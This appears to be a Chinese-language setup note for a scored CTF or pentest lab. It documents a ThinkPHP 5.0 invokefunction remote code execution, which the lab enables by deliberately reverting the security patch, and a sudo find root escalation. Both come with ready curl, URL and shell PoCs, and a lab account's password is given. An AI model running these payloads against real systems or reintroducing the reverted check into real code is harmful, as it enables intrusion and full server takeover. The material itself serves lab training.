## 漏洞信息

### 漏洞 1: ThinkPHP 5.0 invokefunction RCE (边界突破 500分)

**条件**: `app_debug=true` + 安全补丁回退

**POC**:
```bash
# 方法1: curl (推荐)
curl -s -G 'http://192.168.100.20/' \
  --data-urlencode 's=index/\think\app/invokefunction' \
  --data-urlencode 'function=call_user_func_array' \
  --data-urlencode 'vars[0]=system' \
  --data-urlencode 'vars[1][]=whoami'

# 方法2: 浏览器直接访问
http://192.168.100.20/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

**关键文件**:
- 安全补丁回退: `thinkphp/library/think/App.php` 第 555-557 行 (注释掉的正则检查)
- 调试模式: `application/config.php` `app_debug=true`

**预期结果**: `uid=33(www-data) gid=33(www-data)`

---

### 漏洞 2: operator sudo find 提权 (100分)

**用户**: `operator` / `0p3rat0r@Media`

**sudo 权限**: `(ALL) NOPASSWD: /usr/bin/find`

**提权 POC**:
```bash
sudo find /tmp -exec /bin/sh -p \; -quit
# whoami → root
```

## PHP 8.x 兼容性修复

TP5 原始代码含 PHP 8.0 已移除的 `{}` 数组访问语法。已修复:
- `thinkphp/library/think/db/Query.php:400`: `$value{0}` → `$value[0]`
- `thinkphp/library/think/Error.php:28`: `error_reporting(E_ALL)` → `E_ALL & ~E_DEPRECATED & ~E_NOTICE & ~E_STRICT`
- `thinkphp/library/think/Request.php:1125`: `^`/`$` 锚点 → `\A`/`\z` (PCRE2 兼容)
